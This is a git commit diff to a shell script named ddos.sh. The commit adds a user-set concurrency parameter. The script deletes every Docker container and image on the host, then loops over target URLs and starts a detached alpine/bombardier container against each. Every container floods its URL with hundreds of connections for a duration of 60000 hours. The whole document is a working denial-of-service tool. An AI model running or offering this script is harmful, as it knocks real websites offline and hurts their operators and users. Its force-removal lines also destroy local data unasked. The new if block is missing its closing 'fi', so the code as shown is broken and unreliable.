06721e05d926a7969099641263b82e78a1742442
koterion <koterion317@gmail.com>
2022-02-27 09:37:46 +0200

    Add params

--- ddos.sh
+++ ddos.sh
@@ -1,3 +1,5 @@
+#!/bin/bash
+
 docker rm -f $(docker ps -a -q)
 docker rmi -f $(docker images -q)
 
@@ -7,5 +9,9 @@ for i in "${lines[@]}"
 do
    echo "$i"
    export URL=$i
-   docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $URL
+if [ -n "$1" ]
+then
+  docker run --platform linux/amd64 -d  alpine/bombardier -c $1 -d 60000h -l $URL
+else
+  docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $URL
  done
